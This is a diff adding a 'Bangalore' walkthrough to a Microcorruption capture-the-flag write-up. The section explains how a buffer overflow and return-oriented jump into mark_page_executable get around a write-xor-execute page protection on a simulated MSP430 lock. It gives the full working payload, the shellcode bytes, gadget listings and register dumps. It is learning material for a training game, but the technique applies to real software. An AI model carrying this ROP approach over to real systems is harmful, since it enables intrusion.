@@ -15,6 +15,7 @@
 - [Novosibirsk](#novosibirsk)
 - [Algiers](#algiers)
 - [Vladivostok](#vladivostok)
+- [Bangalore](#bangalore)
 
 ## Introduction
 
@@ -776,5 +777,181 @@ Live Memory Dump
 username = %x%x%x
 password = 4141414141417f00[address from username - 0x226]
 
+## Bangalore
 
+
+This is the most challenging one so far. The trick that was added to this challenge is that the memory pages can be marked as execution only or writable only. This means we can just add our own shell code in and have it execute. We need to either unlock the door without custom shell code, or find a way to disable the protections and execute our own code. But first to start off we will enter a big password that is over 16 characters, "AAABBBCCCCDDDDEEEFFFGGGGHHHH", letting the program run we will then get the error "insn address unaligned". This tells us that we have a buffer overflow and it has overflowed the return address. We can tell by the instruction pointer having 4645 in it. Now the problem we face is what exactly do we point the pointer to. It can not be on the stack where our input is. Since that is write only memory and can not be executed. One way around these protections is return orientated programming, or ROP. What this means is instead of injecting our own shell code into the program. We use the code already in the program to write a program. It will allow us to compute anything on the stack by bouncing around on return addresses that has execution privileges. Since the program is small we don't have a lot of return addresses to use. The only things we can hope for is to put 0x7f into memory then call the interrupt function, or find a way to allow execute on the stack where we have our input. 
+
+```asm
+
+Register State
+
+pc  4645  sp  4000  sr  0010  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0000
+r12 0000  r13 3fee  r14 000a  r15 0000
+
+
+```
+
+If we look at the available "gadgets" we have at our disposal. We can see that there is no way that we can get 0x7f onto the stack before calling the interrupt function.
+
+```asm
+
+// move contents of r14 into r15
+445e:  0f4e           mov	r14, r15
+4460:  3041           ret
+
+// increase stack pointer by 0xa bytes
+4474:  3150 0a00      add	#0xa, sp
+4478:  3041           ret
+
+// move a value (that we wrote) into r11
+4498:  3b41           pop	r11
+449a:  3041           ret
+
+// increase stack pointer by 0x6
+44d8:  3150 0600      add	#0x6, sp
+44dc:  3041           ret
+
+// clear r15
+450e:  0f43           clr	r15
+4510:  3041           ret
+
+```
+
+If we break down how the program marks a page as executable we can see that first the stack pointer starts on the return address of the function. It then puts register r14 into the address 4 down from the return address. Then  the stack pointer moves back 0x6 addresses and the interrupt function is called. Then the stack pointer get moved 0xa addresses ahead. This is the return address of the mark_page_executable, which returns to execute more of the program. Since we have control of where on the function we want to jump to we can skip the r14 part of the mark_page_executable function, because we can't control register r14. We can test calling the mark_page_executable function by giving it this password, "90909090909090909090909090909090ba44".
+
+```asm
+
+44b4 <mark_page_executable>
+44b4:  0e4f           mov	r15, r14
+44b6:  0312           push	#0x0
+44b8:  0e12           push	r14
+44ba:  3180 0600      sub	#0x6, sp
+44be:  3240 0091      mov	#0x9100, sr
+44c2:  b012 1000      call	#0x10
+44c6:  3150 0a00      add	#0xa, sp
+44ca:  3041           ret
+
+
+Register State
+pc  44b4  sp  3ffa  sr  0003  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0044
+r12 0000  r13 0000  r14 0043  r15 0044
+
+3fe0:   0000 0000 0000 0000 0000 0000 0000 ae44   ...............D
+3ff0:   0000 0000 0000 4300 0000 |fc|44 0000 3c44   ......D....D..<D
+                                  SP
+
+Register State
+pc  44ba  sp  3ff6  sr  0004  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0045
+r12 0000  r13 0000  r14 0045  r15 0045
+                                  
+                                  
+3fe0:   0000 0000 0000 0000 0000 0000 0000 ae44   ...............D
+3ff0:   0000 0000 0000 |44|00 0000 |fc|44 0000 3c44   ......D....D..<D
+                        SP
+
+Register State
+pc  44ca  sp  3ffa  sr  0000  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0044
+r12 0000  r13 0000  r14 0044  r15 0044                
+                        
+3fe0:   0000 0000 0000 0000 0000 0000 0000 c644   ...............D
+3ff0:   0000 0000 0000 4400 0000 |fc|44 0000 3c44   ......D....D..<D
+                                  SP
+
+```
+
+If we look at what happens after the login function returns, we can see that we do enter the mark_page_executable function. We also enter it at line 44ba like we want. We can also see that the stack pointer is on address 4000 which is right after our input, which is the address of the mark_page_executable function we want. This means we can enter anything we want here and that page will be marked as executable. The page we want to mark is 0x3f, which is where our input is. The next thing we need is to set the return of address that mark_page_executable will use to the beginning of our input. Since we know that mark_page_executable will look for the address 0x4 addresses up from the address where the page to marked is. We can add that to our password also. We can test this out with the password, "90909090909090909090909090909090ba443f000000ee3f".
+
+```asm
+
+Register State
+pc  44ba  sp  4000  sr  0000  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0000
+r12 0000  r13 3fee  r14 000a  r15 0000
+
+3fd0:   0000 0000 0000 0000 0000 0000 0000 5c44   ..............\D
+3fe0:   7444 0000 0000 0a00 9644 0000 3845 9090   tD.......D..8E..
+3ff0:   9090 9090 9090 9090 9090 9090 9090 ba44   ...............D
+4000:   |00|00 0000 0000 0000 0000 0000 0000 0000   ................
+         SP
+
+Register State
+pc  44ca  sp  4004  sr  0000  cg  0000
+r04 0000  r05 5a08  r06 0000  r07 0000
+r08 0000  r09 0000  r10 0000  r11 0000
+r12 0000  r13 3fee  r14 000a  r15 0000
+
+3fd0:   0000 0000 0000 0000 0000 0000 0000 5c44   ..............\D
+3fe0:   7444 0000 0000 0a00 9644 0000 3845 9090   tD.......D..8E..
+3ff0:   9090 9090 9090 9090 c644 9090 9090 ba44   .........D.....D
+4000:   0000 0000 |00|00 0000 0000 0000 0000 0000   ................
+                   SP
+
+```
+
+Using that password gets us code execution. The problem is that the code we executed is nop code. We need to figure out how what shell code we need to execute to open the door. If we look at all the other challenges we can see that the interrupt value is put on the stacked. It is then or-ed with 0x8000 getting 0xff00 in the sr register. Then finally the interrupt 0x10 is called. This challenge is different this time the values are hard coded and there is no or-ing. The value is just placed onto the sr register and then 0x10 is called. So all we need to do is create sell code that moves 0xff00 onto the sr register, then call 0x10. This should unlock the door for us. The shell code for that is "324000ffb0121000". That is 8 characters long we need to add another 8 characters of nop code for filler. Then we need to add the address of the mark_page_executable "ba44". Then "3f00" for the page we want to mark as executable. Lastly we add 4 characters of filler, then the address of the start of out shell code. Giving us the password of, "324000ffb01210009090909090909090ba443f000000ee3f". Entering that password unlocks the door and completes the challenge.
+
+```asm
+
+Another challenge's interrupt call
+
+44b0 <conditional_unlock_door>
+
+44b0:  0412           push	r4
+44b2:  0441           mov	sp, r4
+44b4:  2453           incd	r4
+44b6:  2183           decd	sp
+44b8:  c443 fcff      mov.b	#0x0, -0x4(r4)
+44bc:  3e40 fcff      mov	#0xfffc, r14
+44c0:  0e54           add	r4, r14
+44c2:  0e12           push	r14
+44c4:  0f12           push	r15
+44c6:  3012 7e00      push	#0x7e
+44ca:  b012 3645      call	#0x4536 <INT>
+44ce:  5f44 fcff      mov.b	-0x4(r4), r15
+44d2:  8f11           sxt	r15
+44d4:  3152           add	#0x8, sp
+44d6:  3441           pop	r4
+44d8:  3041           ret
+
+4536 <INT>
+4536:  1e41 0200      mov	0x2(sp), r14
+453a:  0212           push	sr
+453c:  0f4e           mov	r14, r15
+453e:  8f10           swpb	r15
+4540:  024f           mov	r15, sr
+4542:  32d0 0080      bis	#0x8000, sr
+4546:  b012 1000      call	#0x10
+454a:  3241           pop	sr
+454c:  3041           ret
+
+
+Bangalore's interrupt call
+
+446c:  3240 0082      mov	#0x8200, sr
+4470:  b012 1000      call	#0x10
+
+0010 <__trap_interrupt>
+0010:  3041           ret
+
+
+mov #0xff00, sr
+call #0x10
+
+324000ffb0121000
+```
+
+
+### Solved
+
+password = 324000ffb01210009090909090909090ba443f000000ee3f
 
